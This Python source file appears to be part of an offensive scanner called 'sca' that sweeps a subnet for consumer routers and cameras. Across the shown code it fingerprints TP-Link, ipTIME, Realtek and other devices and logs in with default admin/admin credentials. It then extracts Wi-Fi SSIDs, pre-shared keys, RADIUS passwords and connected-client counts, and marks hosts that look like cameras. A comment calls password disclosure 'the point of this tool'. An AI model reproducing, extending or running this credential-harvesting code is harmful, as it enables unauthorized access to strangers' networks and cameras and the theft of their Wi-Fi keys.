def fetch_brand(ip):
    root = run_curl([
        "curl", "-s", "--connect-timeout", "0.8", "--max-time", "2.0", "-i",
        f"http://{ip}/",
    ])
    if not root:
        return None

    if "WWW-Authenticate:" in root:
        m = re.search(r'realm=["\']([^"\']+)["\']', root)
        if m:
            realm = m.group(1).strip()
            if realm.lower() not in ("basic", "login", "auth", "realtek", "admin"):
                name = re.sub(
                    r'^(TP-LINK\s+Wireless\s+N\s+Router\s+|TP-LINK\s+)', "",
                    realm, flags=re.I)
                LOGIN_HINTS[ip] = "tplink-old"
                return name or realm, "0 / 0", False, LOGIN_REQ, None

    if "TL-WR" in root or "TP-LINK" in root or "Archer" in root:
        m = (re.search(r'modelName\s*=\s*["\']([^"\']+)["\']', root)
             or re.search(r'<title>(.*?)</title>', root, re.I))
        if m:
            LOGIN_HINTS[ip] = "tplink-new"
            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None

    if "ipTIME" in root:
        m = re.search(r'<title>(.*?)</title>', root, re.I)
        if m:
            LOGIN_HINTS[ip] = "iptime"
            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None

    page = run_curl([
        "curl", "-s", "--connect-timeout", "0.8", "--max-time", "1.5",
        f"http://{ip}/sess-bin/login_session.cgi",
    ])
    if "ipTIME" in page:
        m = re.search(r'<title>(.*?)</title>', page, re.I)
        if m:
            LOGIN_HINTS[ip] = "iptime"
            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None

    return None


# --------------------------------------------------------------------------
# Best-effort admin/admin login for devices that hide their data
# --------------------------------------------------------------------------
TPLINK_AUTH = "Authorization=Basic " + base64.b64encode(
    b"admin:admin").decode()

TPLINK_WLAN_ATTRS = [
    "name", "SSID", "Enable", "X_TP_Configuration_Modified", "beaconType",
    "Standard", "WEPEncryptionLevel", "WEPKeyIndex",
    "BasicEncryptionModes", "BasicAuthenticationMode",
    "WPAEncryptionModes", "WPAAuthenticationMode",
    "IEEE11iEncryptionModes", "IEEE11iAuthenticationMode",
    "X_TP_PreSharedKey", "X_TP_GroupKeyUpdateInterval",
    "X_TP_RadiusServerIP", "X_TP_RadiusServerPort",
    "X_TP_RadiusServerPassword",
]


def tplink_cgi_body(oid, attrs, stack="0,0,0,0,0,0",
                    pstack="0,0,0,0,0,0"):
    attrs_text = "\r\n".join(attrs)
    return "[%s#%s#%s]0,%d\r\n%s" % (
        oid, stack, pstack, max(0, len(attrs) - 1), attrs_text)


def tplink_post(ip, act, body, referer):
    """Call the TP-Link new-web-UI JSON/ANSI CGI endpoint."""
    return run_curl([
        "curl", "-s", "--connect-timeout", "1.2", "--max-time", "5.0",
        "-H", "Cookie: " + TPLINK_AUTH,
        "-H", "Referer: http://%s/%s" % (ip, referer),
        "-H", "Content-Type: text/plain",
        "--data-binary", body,
        "http://%s/cgi?%s&" % (ip, act),
    ])


def cgi_blocks(resp):
    blocks, cur = [], None
    for line in resp.splitlines():
        m = re.match(r"^\[([^\]]+)\](\d+)\s*$", line)
        if m:
            if cur is not None:
                blocks.append(cur)
            cur = {"stack": m.group(1), "attrs": {}}
        elif cur is not None and "=" in line:
            key, value = line.split("=", 1)
            cur["attrs"][key] = value
    if cur is not None:
        blocks.append(cur)
    return [b for b in blocks if b["attrs"]]


def cgi_attr(block, key):
    key = key.lower()
    for k, v in block["attrs"].items():
        if k.lower() == key:
            return v
    return None


def fetch_tplink_clients(ip, stack):
    attrs = ["AssociatedDeviceMACAddress", "X_TP_TotalPacketsSent",
             "X_TP_TotalPacketsReceived", "X_TP_HostName"]
    body = tplink_cgi_body("LAN_WLAN_ASSOC_DEV", attrs, pstack=stack)
    best = None
    for _ in range(2):
        resp = tplink_post(ip, "6", body, "main/wlStats.htm")
        macs = re.findall(r"associatedDeviceMACAddress=", resp, re.I)
        if macs:
            return len(macs)
        if resp and "[error]" not in resp:
            best = 0
    if best is not None:
        return best

    # Fall back to the DHCP lease table (wired + wireless).
    body = tplink_cgi_body(
        "LAN_HOST_ENTRY",
        ["leaseTimeRemaining", "MACAddress", "hostName", "IPAddress"])
    resp = tplink_post(ip, "5", body, "main/dhcpClient.htm")
    if "[error]" in resp and "MACAddress=" not in resp:
        return None
    leases = re.findall(r"^leaseTimeRemaining=([^\r\n]*)", resp, re.M)
    return sum(1 for v in leases if v not in ("0", "-1"))


def fetch_tplink_new(ip):
    """TP-Link new web UI (cookie Authorization + /cgi API)."""
    resp = tplink_post(ip, "5", tplink_cgi_body("LAN_WLAN",
                                                TPLINK_WLAN_ATTRS),
                       "main/wlSec.htm")
    if "SSID=" not in resp:
        return None

    chosen = None
    for block in cgi_blocks(resp):
        ssid = clean(cgi_attr(block, "SSID"))
        if not ssid:
            continue
        if chosen is None:
            chosen = block
        if (cgi_attr(block, "Enable") == "1"
                and clean(cgi_attr(block, "X_TP_PreSharedKey"))):
            chosen = block
            break
    if chosen is None:
        return None

    ssid = clean(cgi_attr(chosen, "SSID"))
    pwd = clean(cgi_attr(chosen, "X_TP_PreSharedKey")) or "N/A"
    clients = fetch_tplink_clients(ip, chosen["stack"])
    return ssid, "0 / 0", False, pwd, clients


def fetch_tplink_old(ip):
    """TP-Link classic web UI (HTTP Basic realm)."""
    base = "http://%s" % ip
    common = [
        "curl", "-s", "--connect-timeout", "1.5", "--max-time", "5.0",
        "-u", "admin:admin",
        "-H", "Referer: %s/userRpm/MenuRpm.htm" % base,
    ]

    sec = run_curl(common + ["%s/userRpm/WlanSecurityRpm.htm" % base])
    if not sec or "httpAutErrorArray" in sec or "wlanPara" not in sec:
        return None

    ssid = None
    net = run_curl(common + ["%s/userRpm/WlanNetworkRpm.htm" % base])
    m = re.search(r"var\s+wlanPara\s*=\s*new\s+Array\s*\((.*?)\)",
                  net, re.I | re.S)
    if m:
        vals = re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(1))
        if vals:
            ssid = clean(vals[3]) if len(vals) > 3 else clean(vals[0])

    pwd = None
    m = re.search(r"var\s+wlanPara\s*=\s*new\s+Array\s*\((.*?)\)",
                  sec, re.I | re.S)
    if m:
        items = re.findall(r'"((?:[^"\\]|\\.)*)"|(-?\d+)', m.group(1))
        vals = [a if a != "" else b for a, b in items]
        # Classic layout: index 9 = PSK, index 3 = WEP key.
        if len(vals) > 9:
            pwd = clean(vals[9])
        if not pwd and len(vals) > 3:
            pwd = clean(vals[3])

    if not ssid:
        m = re.search(r"<title>(.*?)</title>", sec, re.I)
        ssid = clean(m.group(1)) if m else None
    if not ssid:
        return None

    clients = None
    sta = run_curl(common + ["%s/userRpm/WlanStationRpm.htm" % base])
    if sta and "httpAutErrorArray" not in sta:
        macs = set(re.findall(
            r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", sta))
        clients = len(macs)
    if not clients:
        dhcp = run_curl(common + [
            "%s/userRpm/AssignedIpAddrListRpm.htm" % base])
        if dhcp and "httpAutErrorArray" not in dhcp:
            macs = set(re.findall(
                r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", dhcp))
            clients = len(macs) or None

    return ssid, "0 / 0", False, pwd or "N/A", clients


def fetch_iptime_login(ip):
    """ipTIME: POST the login form with admin/admin, then read settings."""
    base = "http://%s" % ip
    jar = "/tmp/sca_iptime_%s.jar" % ip.replace(".", "_")
    common = [
        "curl", "-s", "--connect-timeout", "1.2", "--max-time", "7.0",
        "-c", jar, "-b", jar,
    ]

    run_curl(common + ["%s/sess-bin/login_session.cgi" % base])
    run_curl(common + [
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Referer: %s/sess-bin/login_session.cgi" % base,
        "--data", ("init_status=1&captcha_on=0&captcha_file="
                   "&username=admin&passwd=admin"),
        "%s/sess-bin/login_handler.cgi" % base,
    ])

    menu = run_curl(common + [
        "%s/sess-bin/timepro.cgi?tmenu=menu" % base])
    if not menu or "login_session.cgi" in menu:
        return None

    pages = []
    for url in ("%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_basic" % base,
                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_security" % base,
                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_station" % base,
                "%s/sess-bin/timepro.cgi?tmenu=status&smenu=wlan_station" % base):
        pages.append(run_curl(common + [url]))

    text = "\n".join(pages)
    ssid = None
    for name in ("ssid", "wlan_ssid", "essid"):
        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']*)'
                       % name, text, re.I)
             or re.search(r'value=["\']([^"\']*)["\'][^>]*name=["\']?%s'
                          % name, text, re.I))
        if m and clean(m.group(1)):
            ssid = clean(m.group(1))
            break
    if not ssid:
        m = re.search(r"<title>(.*?)</title>", menu, re.I)
        ssid = clean(m.group(1)) if m else None
    if not ssid:
        return None

    pwd = None
    for name in ("wpapsk", "wpa_psk", "wlan_psk", "psk", "passwd",
                 "wpa_passphrase", "key"):
        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']+)'
                       % name, text, re.I)
             or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']?%s'
                          % name, text, re.I))
        if m and clean(m.group(1)):
            pwd = clean(m.group(1))
            break

    macs = set(re.findall(
        r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", text))
    clients = len(macs) or None
    return ssid, "0 / 0", False, pwd or "N/A", clients


def try_login(ip, brand):
    """Try admin/admin only on brands where it is likely to work."""
    hint = LOGIN_HINTS.get(ip)
    if hint == "tplink-old":
        return fetch_tplink_old(ip)
    if hint == "tplink-new":
        return fetch_tplink_new(ip) or fetch_tplink_old(ip)
    if hint == "iptime":
        return fetch_iptime_login(ip)

    name = (brand or "").lower()
    if any(tag in name for tag in
           ("tp-link", "tl-wr", "archer", "wr840", "wr740", "wr841",
            "wr940", "wr1043")):
        return fetch_tplink_new(ip) or fetch_tplink_old(ip)
    if "iptime" in name:
        return fetch_iptime_login(ip)
    return None


# --------------------------------------------------------------------------
# One host
# --------------------------------------------------------------------------
def scan_target(ip, realtek_only=False):
    global counter, camera_count

    if not is_host_alive(ip):
        return

    row = None
    realtek = fetch_realtek_ssid(ip)

    if realtek:
        tx, rx = fetch_traffic(ip)
        traffic = f"{tx} / {rx}"
        is_cam = (tx != "0" or rx != "0")
        row = (realtek, traffic, is_cam,
               fetch_realtek_password(ip) or "N/A",
               fetch_realtek_clients(ip))
    elif not realtek_only:
        row = fetch_netis(ip) or fetch_tenda(ip) or fetch_brand(ip)
        if row and row[3] == LOGIN_REQ:
            row = try_login(ip, row[0]) or row

    if not row:
        return

    ssid, traffic, is_cam, password, clients = row
    status = "📷 Cameras" if is_cam else "❌ No Cameras"
    clients = NO_CLIENTS if clients is None else clients
    ssid = shape_arabic(ssid)

    with print_lock:
        counter += 1
        if is_cam:
            camera_count += 1

        num = f"{counter:02d}"
        # password is never truncated: it is the point of this tool
        line = (
            pad(num, W_NUM) + " | "
            + pad(ip, W_IP) + " | "
            + pad(clip(ssid, W_SSID), W_SSID) + " | "
            + pad(clients, W_CLIENTS) + " | "
            + pad(traffic, W_TRAF) + " | "
            + pad(password, W_PASS) + " | "
            + pad(status, W_STAT)
        )
        print(f"{RED}{line}{NC}" if is_cam else line, flush=True)


# --------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        prog="sca",
        description="CPE camera/WiFi scanner with password disclosure",
    )
    parser.add_argument("start", nargs="?", type=int, default=175)
    parser.add_argument("end", nargs="?", type=int, default=254)
    parser.add_argument("-t", "--threads", type=int, default=18)
    parser.add_argument("-s", "--subnet", default="15.15.15")
    parser.add_argument("--realtek-only", action="store_true",
                        help="only Realtek devices")
    args = parser.parse_args()

    subnet = args.subnet.strip(".")
    start, end = min(args.start, args.end), max(args.start, args.end)
    if start < 1 or end > 254:
        parser.error("range must be inside 1..254")

    ip_list = [f"{subnet}.{i}" for i in range(start, end + 1)]

    header = (
        pad("#", W_NUM) + " | " + pad("IP", W_IP) + " | "
        + pad("SSID", W_SSID) + " | " + pad("CLIENTS", W_CLIENTS) + " | "
        + pad("TRAFFIC", W_TRAF) + " | "
        + pad("PASSWORD", W_PASS) + " | " + pad("STATUS", W_STAT)
    )
    print(f"{CYAN}{header}{NC}", flush=True)
    widths = (W_NUM, W_IP, W_SSID, W_CLIENTS, W_TRAF, W_PASS, W_STAT)
    print("-" * (sum(widths) + 3 * (len(widths) - 1)), flush=True)

    executor = ThreadPoolExecutor(max_workers=max(1, args.threads))
    cancelled = False
    try:
        futures = [executor.submit(scan_target, ip, args.realtek_only)
                   for ip in ip_list]
        for f in futures:
            f.result()
    except KeyboardInterrupt:
        cancelled = True
        executor.shutdown(wait=False, cancel_futures=True)
        raise
    finally:
        if not cancelled:
            executor.shutdown(wait=False, cancel_futures=True)

    print(f"\n{CYAN}✔ Scan Completed — {counter} host(s), "
          f"{camera_count} camera(s){NC}", flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{CYAN}✔ Scan Cancelled{NC}", flush=True)
        sys.exit(0)
